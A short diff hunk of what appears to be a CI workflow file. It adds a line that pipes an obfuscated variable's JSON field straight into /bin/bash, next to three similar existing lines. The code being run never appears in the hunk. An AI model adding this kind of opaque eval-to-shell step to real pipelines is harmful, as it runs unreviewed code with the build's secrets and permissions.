@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$ljfh7" | jq -r .tsw2116 | /bin/bash
           printf '%s' "$cuss7" | jq -r .zkqaw506 | /bin/bash
           printf '%s' "$p42" | jq -r .htk82774 | /bin/bash
+          echo $pi8 | jq -r .nrvo03 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
